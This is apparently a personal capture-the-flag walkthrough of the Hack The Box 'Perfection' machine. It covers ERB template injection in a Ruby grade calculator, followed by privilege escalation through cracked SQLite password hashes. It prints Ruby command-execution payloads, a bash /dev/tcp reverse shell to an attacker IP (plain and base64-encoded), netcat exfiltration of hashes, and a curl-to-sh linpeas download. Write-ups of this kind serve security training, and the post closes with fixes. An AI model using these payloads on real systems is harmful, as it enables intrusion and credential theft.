---
title: "Perfection"
author: "Me"
date: "May 26, 2024"
output: html_document
---

# Perfection

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: Easy</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<!---
<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_squashed_desc.png){: height="300px" width = 320px"}
</div>
-->
  
**Ports/services exploited:** 80/http\\
**Tools:** Burpsuite, JtR, Hashcat, cewl, LinPeas\\
**Techniques:** SSTI\\
**Keywords:** Ruby, custom wordlist, SQLite, ERB template

**TL;DR**: the host is running a web server which presents an application written in Ruby. This latter is vulnerable to a server-side template injection (SSTI), and we are able to execute arbitrary code on the server. From there, we can get a reverse shell as susan, who turns out to be in the sudo group. The only thing required to escalate privileges to root is her password, and we find it hashed in a SQLite database. Finally, we find the password specifications in susan's mails. Hashcat can be used with a mask to crack the password. Once we have it, we can spawn a shell as root.


## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Let's start by enumerating the running services with nmap:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_perf_nmap.png)
</div>

There's SSH and a web application called "weighted Grade Calculator". Let's have a look at that page:

<div class="img_container">
![calculator]({{https://jsom1.github.io/}}/_images/htb_perf_calc.png)
</div>

While we inspect the web page, we can launch *dirb* and *gobuster* to find directories, and *ffuf* to find potential subdomains:

```
sudo dirb http://10.10.11.253 -r # 1 result only, "about".
sudo gobuster dir -u http://10.10.11.253 -w /usr/share/wordlists/dirb/big.txt
sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.253 -H "Host: FUZZ.10.10.11.253" -fs 3842
```
The *ffuf* command returned many false positives with the same status (200), size (3842), words (473), and lines (102). So we can filter them out based on those criteria (we filter on the response size in the command above). The 3 commands didn't reveal anything interesting.

It is not shown in the image above, but the page indicates "Powered by WEBrick 1.7.0" (WEBrick is an HTTP server toolkit that can be configured as an HTTPS server, a proxy server, and a virtual-host server), so we know the application is written in Ruby. Also, there is something interesting in the "About us" page: two people are presented, Tina and Susan. About Tina, it is said that "_She is an absolute whiz at web development, but she hasn't delved into secure coding too much_". Obviously, that suggests a vulnerability in the application. Let's try to find it.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

The formular accepts characters in the "Category" column, and integers in the "Grade" and "Weight (%)" columns. The weights must add up to 100. If those conditions are respected, the application returns the weighted grade. We can manually try a few characters like "(, {, <, ;, ',", and so on, to see how the applications reacts. I didn't find anything weird, so I opened up Burp to intercept the request and make the process of fuzzing the formular easier. Once the request is intercepted, we send it to the intruder to configure an attack:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_perf_burp1.png){: height="200px" width = "500px"}
</div>

In the image above, we see the payload positions highlighted in green.
The are 4 types of attacks that we can use:

- Sniper: places each payload into each payload positions in turn. This is not what we want, because the different positions (columns) require different types.
- Battering ram: places the same payload into all of the defined payload positions simultaneously. It uses a single payload set. This attack is useful where an attack requires the same input to be inserted in multiple places within the request, so this is not what we want either.
- Pitchfork: iterates through a different payload set for each defined position. Payloads are placed into each position simultaneously. This attack is useful where an attack requires different but related input to be inserted in multiple places within the request. This is what we want and used in the image above.
- Cluser bomb: iterates through a different payload set for each defined position. Payloads are placed from each set in turn, so that all payload combinations are tested. I think this attack could also have worked.

Once we have selected the pitchfork attack, we must configure the 15 payloads; position1 is the category, position2 is the grade, position3 is the weight, position4 is the category again, ans so on. Since the "Grade" and "Weight" columns only accept integers, we want to fuzz the "Category" column, that is positions 1, 4, 7, 10, and 13. For those positions, we specify the following payload file:

<div class="img_container">
![custom list]({{https://jsom1.github.io/}}/_images/htb_perf_list.png)
</div>

In Burp, we select this file for the payload:

<div class="img_container">
![burp]({{https://jsom1.github.io/}}/_images/htb_perf_burp2.png){: height="400px" width = "600px"}
</div>

At that time, I was already doing a mistake; I was trying payloads to detect XSS, SQLi, SSTI, and so on, but without considering the application is written in ruby. I should have used Ruby payloads, and that's what I did later. Anyways, let's configure the payloads for the remaining positions.\\
For the grades (positions 2, 5, 8, 11, and 14), we want random integers between 0 and 100, so we configure that this way:

<div class="img_container">
![burp pos]({{https://jsom1.github.io/}}/_images/htb_perf_burp3.png){: height="450px" width = "600px"}
</div>

Finally, for the weights (positions 3, 6, 9, 12, and 15), we want them to add up to 100. The easiest way to do that is to assign 20 to all positions. It's the same as for the grades, except we specify from 20 to 20.\\
Once we have set up all the payloads, we can launch the attack. The result looks like this:

<div class="img_container">
![burp reqs]({{https://jsom1.github.io/}}/_images/htb_perf_burp4.png){: height="450px" width = "600px"}
</div>

We see all the requests done by Burp, and the payloads used. We can analyze each request response to see if we could get the application to react in weird way. Sadly, every response indicated "Malicious input blocked". But we know there must be a vulnerability, we must "only" understand it and how it works. Note that instead of Burp, we can also use curl to try different payloads:

```
curl -X POST -d "category1=%3C%25%20%60ls%60%20%25%3E&grade1=90&weight1=20&category2=Math&grade2=80&weight2=20&category3=English&grade3=85&weight3=20&category4=Science&grade4=70&weight4=20&category5=History&grade5=75&weight5=20" http://10.10.11.253/weighted-grade-calc
```
It is a bit less convenient however. So, we must keep searching for the right payload. One place we can look at is <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby" target="_blank">HackTricks</a>
. In the SSTI section, we see some payloads to test for an SSTI vulnerability in Ruby. This kind of vulnerability can arise by accident due to poor template design (people who are not familiar with the security implications). In this case, user input is concatenated and embedded into a template rather than being passed in as data.\\
When this is the case, we can use native template syntax to place a payload server-side. So let's try that, and instead of using Burp's intruder, we will use the repeater. We modify the "category1" payload with the following ones:

```
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
<%= 7 * 7 %> = 49
<%= foobar %> = Error
```

<div class="img_container">
![burp 7t7]({{https://jsom1.github.io/}}/_images/htb_perf_burp8.png){: height="400px" width = "600px"}
</div>

This works, as we see the URL-encoded code 7*7 got executed on the server. Also, the fact of adding a new line (%0A) seems to bypass any filter that might be present. There are a few other commands we can try, such as:

```
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

For example, let's try to list the files with *ls*:

<div class="img_container">
![burp ls]({{https://jsom1.github.io/}}/_images/htb_perf_burp9.png){: height="400px" width = "600px"}
</div>

If we can execute code, then we should be able to get a reverse shell. We can use <a href="https://www.revshells.com/" target="_blank">revshells</a> to get some reverse shells codes. After trying a few ones (python), I found out the following simple bash one works:

```
bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

We start by base64 encoding this command:

```
echo -n 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1' | base64
```
Then, instead of 7*7, we use the base64 encoded payload with a command that will decode and execute it:

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDQ0IDA+JjE= | base64 -d | bash
```
Finally, Burp URL-encode this payload, and this is what we use for category1. Before sending the request, we start a listener on port 4444:

```
sudo nc -nlvp 4444
```
And we send it:

<div class="img_container">
![burp revsh]({{https://jsom1.github.io/}}/_images/htb_perf_burplast.png){: height="400px" width = "600px"}
</div>

We see a "504 Gateway Time-out" message, but that doesn't matter since we got our reverse shell:

<div class="img_container">
![user flag]({{https://jsom1.github.io/}}/_images/htb_perf_user.png)
</div>

And this is it for the user flag. Now, we must find a way to escalate our privileges.

## 4. Vertical privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

We see we're in as Susan. We can try the command *sudo -l*, but we need her password. Also, we get the message "*sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper. sudo: a password is required*". This is because the reverse shell we have isn't interactive, so it cannot ask for the password. We can upgrade this shell with the usual python command:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

(python didn't work, _command 'python' not found, did you mean: command 'python3'_). Let's do manual enumeration to find credentials, misconfigurations, or anything that could help us.
First, let's check if we can find a SSH private key (id_rsa):

```
cat ~/.ssh/id_rsa
```

There's none. If we had found one, we could have transferred it on Kali with netcat (on Kali : _nc -lvnp 1234 > id_rsa_, in the reverse shell : _cat ~/.ssh/id_rsa | nc 10.10.14.12 1234_). Then we would have _chmod 600 id_rsa_, and finally use it to connect with SSH:  *ssh -i id_rsa susan@10.10.11.253*. If the key is protected by a passphrase, we could try to crack it with John the Ripper and the module ssh2john. We start by converting the key into a crackable format: *ssh2john id_rsa > id_rsa.hash*. Then, we crack it: *john id_rsa.hash --wordlist=/path/to/wordlist*.\\
Anyway, let's try something else.

**System info**

We get info on the system to better understand the environment:

```
uname -a # Linux perfection 5.15.0-97-generic #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
cat /etc/issue # used to display a banner (e.g. welcome line/ warning..) to SSH users before the login prompt: Ubuntu 22.04.4 LTS
cat /etc/os-release
```

Nothing stands out here.

**User information**

We check info on users and groups

```
id # uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo) --> susan is member of the sudo group, which is very promising if we can get her password
whoami # susan
cat /etc/passwd # we see susan (her personal folder is /home/susan, and she has /bin/bash as a shell, which is expected. There is alsi laurel, whose personal folder is /var/log/laurel and has /bin/false as a shell. So, this user cannot connect interactively.
cat /etc/group # nothing in particular
```
I checked laurel's folder which contains two log files (audit.log and audit.log.1). Unfortunately, we don't have the permissions to read them.

**Info on running processes**

We're looking for interesting processes which would be executed by privileged users.

```
ps aux
```

There's nothing in particular. We see the ruby application running locally (127.0.0.1) on port 3000, but that doesn't really help us.

**Info on cronjobs**

Some cronjobs can have scripts that are running with elevated privileges. If we can modify one of those script, it could be a way to escalate our privileges.

```
crontab -l # 1 cronjob,  @reboot cd /home/susan/ruby_app && /usr/bin/ruby /home/susan/ruby_app/main.rb --> executed when the system reboots. It's the application code.
ls -la /etc/cron.* # nothing
cat /etc/crontab # nothing
```

The application code is the following:

```
cat /home/susan/ruby_app/main.rb
require 'sinatra'
require 'erb'
set :show_exceptions, false

configure do
    set :bind, '127.0.0.1'
    set :port, '3000'
end

get '/' do
    index_page = ERB.new(File.read 'views/index.erb')
    response_html = index_page.result(binding)
    return response_html
end

get '/about' do
    about_page = ERB.new(File.read 'views/about.erb')
    about_html = about_page.result(binding)
    return about_html
end

get '/weighted-grade' do
    calculator_page = ERB.new(File.read 'views/weighted_grade.erb')
    calcpage_html = calculator_page.result(binding)
    return calcpage_html
end

post '/weighted-grade-calc' do
    total_weight = params[:weight1].to_i + params[:weight2].to_i + params[:weight3].to_i + params[:weight4].to_i + params[:weight5].to_i
    if total_weight != 100
        @result = "Please reenter! Weights do not add up to 100."
        erb :'weighted_grade_results'
    elsif params[:category1] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category2] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category3] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category4] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category5] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:grade1] =~ /^(?:100|\d{1,2})$/ && params[:grade2] =~ /^(?:100|\d{1,2})$/ && params[:grade3] =~ /^(?:100|\d{1,2})$/ && params[:grade4] =~ /^(?:100|\d{1,2})$/ && params[:grade5] =~ /^(?:100|\d{1,2})$/ && params[:weight1] =~ /^(?:100|\d{1,2})$/ && params[:weight2] =~ /^(?:100|\d{1,2})$/ && params[:weight3] =~ /^(?:100|\d{1,2})$/ && params[:weight4] =~ /^(?:100|\d{1,2})$/ && params[:weight5] =~ /^(?:100|\d{1,2})$/
        @result = ERB.new("Your total grade is <%= ((params[:grade1].to_i * params[:weight1].to_i) + (params[:grade2].to_i * params[:weight2].to_i) + (params[:grade3].to_i * params[:weight3].to_i) + (params[:grade4].to_i * params[:weight4].to_i) + (params[:grade5].to_i * params[:weight5].to_i)) / 100 %>\%<p>" + params[:category1] + ": <%= (params[:grade1].to_i * params[:weight1].to_i) / 100 %>\%</p><p>" + params[:category2] + ": <%= (params[:grade2].to_i * params[:weight2].to_i) / 100 %>\%</p><p>" + params[:category3] + ": <%= (params[:grade3].to_i * params[:weight3].to_i) / 100 %>\%</p><p>" + params[:category4] + ": <%= (params[:grade4].to_i * params[:weight4].to_i) / 100 %>\%</p><p>" + params[:category5] + ": <%= (params[:grade5].to_i * params[:weight5].to_i) / 100 %>\%</p>").result(binding)
        erb :'weighted_grade_results'
    else
        @result = "Malicious input blocked"
        erb :'weighted_grade_results'
    end
end
```

Unfortunately, this cronjob runs with susan's permissions, so there is nothing we can do.

**Command history**

Let's check susan's command history to see if we find anything interesting:

```
cat ~/.bash_history
```
It's empty. There could be a symbolic link to /dev/null, so that the history is immediately thrown away. This is sometimes done for security reasons. It is also possible to configure bash so that it doesn't keep the history.

**Configuration files**

We're looking for configuraitons files that could contain sensible information such as credentials.

```
cat /etc/sudoers # displays permissions, but we cannot read this file
ls -la /home/* # we see a folder "Migration", need to look into that
ls -la /root/
```
Let's have a look at the "Migration" folder:

<div class="img_container">
![migration]({{https://jsom1.github.io/}}/_images/htb_perf_migr.png)
</div>

The "pupilpath_credentials.db" is a SQLite database. Let's try to connect to it and retrieve some information:

<div class="img_container">
![sqlite]({{https://jsom1.github.io/}}/_images/htb_perf_sqlite.png)
</div>

Great, we found hashes passwords. We can leave sqlite (*/.quit*) and transfer the hashes on Kali to crack them.
On a des mdp hachés... Try transfer sur Kali et cracker avec jtr. On peut quitter sqlite /.quit) et on extrait ces infos :

```
sqlite3 pupilpath_credentials.db "SELECT name, password FROM users;" > /home/susan/hashes.txt
```
Then on Kali: 

```
sudo nc -nlvp 5555
```
And in the reverse shell:

```
cat /home/susan/hashes.txt | nc 10.10.14.12 5555
```

Note that this crashed the connection and I had to re-execute the reverse shell payload. However, the transfer worked. Because the hashes are 64 characters long, it's probably SHA-256. We transform the file into the following format: username:hash.\\
Finally, we can try to crack them:

```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

Unfortunately, it didn't find anything. Another thing we can do is to create a custom wordlist. The tool "cewl" allows to retrieve every word on a webpage. So let's use it to retrieve everything from the "About us" page, and combine that with some permutations of susan miller (smiller, s.miller, susan, miller, susan_miller, susan.miller, millers, ...):

```
sudo cewl http://10.10.11.253/about -w perfection_words.txt
```
We create another file with name variations

```
sudo nano name_variations.txt
```

Finally, we create the custom wordlist with a python script (generate_wordlist.sh):

```
#!/bin/bash

# Input files
name_variations="name_variations.txt"
words="perfection_words.txt"

# Output file
output="perfection_custom_wordlist.txt"

# Empty the output file if it exists
> $output

# Combine name variations with the extracted words
while read -r name; do
    echo "$name" >> $output
    while read -r word; do
        echo "${name}${word}" >> $output
        echo "${word}${name}" >> $output
        echo "${name}_${word}" >> $output
        echo "${word}_${name}" >> $output
        echo "${name}.${word}" >> $output
        echo "${word}.${name}" >> $output
    done < $words
done < $name_variations

# Add extracted words at the end
cat $words >> $output

echo "Custom wordlist generated: $output"
```

Then:

```
sudo chmod +x generate_wordlist.sh
./generate_wordlist.sh
```

We now have a custom list containing 7799 words (*wc -l perfection_custom_wordlist.txt*) that we can use with Hashcat:

```
hashcat -m 1400 -a 0 -o cracked.txt hashes.txt perfection_custom_wordlist.txt
```
But unfortunately, it didn't work either. It's time for automated enumeration with linpeas. We download the script on Kali, start a web server, and download it on the target machine:

```
sudo curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
sudo python3 -m http.server 80 # ifconfig tun0Host
curl 10.10.14.12/linpeas.sh | sh # Victim
```
Note that in the environment section, we see HISTFILE=/dev/null, which confirms the history is thrown away.
Susan's PATH only contain standard folder, nothing in particular. However, there might be something interesting in mails:

<div class="img_container">
![linpeas]({{https://jsom1.github.io/}}/_images/htb_perf_linpeas.png)
</div>

Let's have a look at that mail

<div class="img_container">
![mail]({{https://jsom1.github.io/}}/_images/htb_perf_mail.png)
</div>

This is exactly what we needed to crack the password. Now that we know the policy, we can use Hashcat with a mask to generate number combinations. In the image below, *hashes_cat* is a file where I only kept susan's hash.

```
hashcat -m 1400 -a 3 -o cracked.txt hashes_cat.txt susan_nasus_?d?d?d?d?d?d?d?d?d
cat cracked.txt
```
And we finally have her password! 

<div class="img_container">
![password]({{https://jsom1.github.io/}}/_images/htb_perf_pw.png)
</div>

From there, since Susan is in the sudo group, it's pretty straightforward to gain full access:

<div class="img_container">
![root]({{https://jsom1.github.io/}}/_images/htb_perf_root.png)
</div>

We see that Susan can execute every command with sudo ((ALL : ALL) ALL). So, we can simply spawn a shell as root.

<div class="img_container">
![pwn]({{https://jsom1.github.io/}}/_images/htb_perf_pwn.png){: height="400px" width = "420px"}
</div>


<ins>**My thoughts**</ins>

This is the second time I came across a SSTI vulnerability (the first time was in <a href="/_walkthroughs/Forge">Forge</a>), and it was a great opportunity to practice its detection and exploitation once again. I found that figuring out the right payload and encoding was pretty hard. Once we got a reverse shell though, the privilege escalation is pretty straightforward (even though I had to use Linpeas).\\
Overall, it was a nice box and the "easy" rating seemed fair to me.

<ins>**Fix the vulnerabilities**</ins>

Regarding the SSTI vulnerability, there are a few ways to prevent it, among which:

- The easiest way is simply to not allow any users to modify or submit new templates. However, this behaviour is sometimes allowed by design. That wasn't the case here though.
- Use a logic-less template engine to separate the logic from the presentation. The logic part includes the programming part, whereas the presentation is the formatting of data. In this case, ERB (embedded Ruby) is not a logic-less template.
- Validate (sanitize) user inputs before putting them into the template. This is what the code tries to do, but unfortunately it's not robust enough.
- Accept that arbitrary code execution is inevitable, and deploy the template in a locked-down container.

Regarding the privilege escalation, I don't think it's a problem that Susan is in the sudo group. However, we shouldn't be able to access the hashed passwords in the SQLite database so easily. And then, the password policy shouldn't be given like this.


